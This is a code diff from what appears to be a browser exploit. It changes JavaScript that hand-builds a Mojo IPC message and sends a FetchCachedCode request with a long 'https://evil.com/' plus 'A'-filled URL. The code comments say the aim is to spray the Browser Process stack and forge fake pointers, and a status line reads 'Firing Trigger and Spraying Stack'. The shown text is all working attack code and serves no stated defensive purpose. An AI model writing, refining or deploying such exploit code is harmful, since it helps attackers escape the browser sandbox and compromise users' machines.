@@ -44,22 +44,30 @@
             // We use FetchCachedCode with a huge URL string to force the Browser Process 
             // to allocate large buffers on the stack while processing the Mojo message.
             // We fill it with 'A's (0x41) to forge fake pointers.
-            const SPRAY_SIZE = 4096;
-            const sprayMsg = new ArrayBuffer(128 + SPRAY_SIZE); 
+            const SPRAY_STR = "https://evil.com/" + "A".repeat(1024) + ".js";
+            
+            // Mojo structs must be 8-byte aligned. 
+            const alignedStrLen = Math.ceil(SPRAY_STR.length / 8) * 8;
+            const sprayMsg = new ArrayBuffer(88 + alignedStrLen); 
             const fv = new DataView(sprayMsg);
+            
             fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
             fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
             fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
             fv.setBigUint64(24, 1n, true); 
+
             fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
             fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
             fv.setBigUint64(48, 8n, true); 
+
             fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
             fv.setBigUint64(64, 8n, true); 
             
-            fv.setUint32(72, 8 + SPRAY_SIZE, true); 
-            fv.setUint32(76, SPRAY_SIZE, true); 
-            for(let i=0; i < SPRAY_SIZE; i++) fv.setUint8(80+i, 0x41); 
+            fv.setUint32(72, 8 + SPRAY_STR.length, true); 
+            fv.setUint32(76, SPRAY_STR.length, true); 
+            for(let i = 0; i < SPRAY_STR.length; i++) {
+                fv.setUint8(80 + i, SPRAY_STR.charCodeAt(i)); 
+            } 
 
             status.innerText = "Step 2: Firing Trigger and Spraying Stack...";
             
